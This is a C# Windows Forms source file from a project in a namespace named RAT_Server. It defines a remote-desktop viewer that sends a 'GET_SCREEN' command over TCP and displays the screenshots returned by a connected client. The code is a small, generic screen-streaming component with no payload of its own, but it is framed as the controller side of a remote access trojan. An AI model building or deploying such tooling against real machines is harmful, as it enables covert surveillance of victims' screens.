using System;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RAT_Server
{
    public partial class RemoteDesktopForm : Form
    {
        private TcpClient client;
        private CancellationTokenSource cancellationTokenSource;

        public RemoteDesktopForm(TcpClient client)
        {
            InitializeComponent();
            this.client = client;
            cancellationTokenSource = new CancellationTokenSource();

            Task.Run(() => ReceiveScreen(cancellationTokenSource.Token));
        }

        private void ReceiveScreen(CancellationToken cancellationToken)
        {
            try
            {
                var stream = client.GetStream();
                var writer = new StreamWriter(stream);

                while (!cancellationToken.IsCancellationRequested)
                {
                    // Enviar comando para solicitar la pantalla
                    writer.WriteLine("GET_SCREEN");
                    writer.Flush();

                    // Leer el tamaño de la imagen
                    var lengthBuffer = new byte[4];
                    int bytesRead = stream.Read(lengthBuffer, 0, lengthBuffer.Length);
                    if (bytesRead == 0) break;

                    int imageSize = BitConverter.ToInt32(lengthBuffer, 0);

                    // Leer la imagen
                    var imageBuffer = new byte[imageSize];
                    int totalBytesRead = 0;

                    while (totalBytesRead < imageSize && !cancellationToken.IsCancellationRequested)
                    {
                        bytesRead = stream.Read(imageBuffer, totalBytesRead, imageSize - totalBytesRead);
                        if (bytesRead == 0) break;

                        totalBytesRead += bytesRead;
                    }

                    if (totalBytesRead == 0) break;

                    using (var memoryStream = new MemoryStream(imageBuffer))
                    {
                        var image = Image.FromStream(memoryStream);

                        Invoke((MethodInvoker)(() =>
                        {
                            pictureBoxRemoteScreen.Image = image;
                        }));
                    }
                }
            }
            catch (IOException)
            {
                if (!cancellationToken.IsCancellationRequested)
                {
                    MessageBox.Show("Conexión perdida con el cliente.");
                }
            }
            catch (Exception ex)
            {
                if (!cancellationToken.IsCancellationRequested)
                {
                    MessageBox.Show($"Error al recibir la pantalla: {ex.Message}");
                }
            }
        }

        private void RemoteDesktopForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            cancellationTokenSource.Cancel();
        }
    }
}
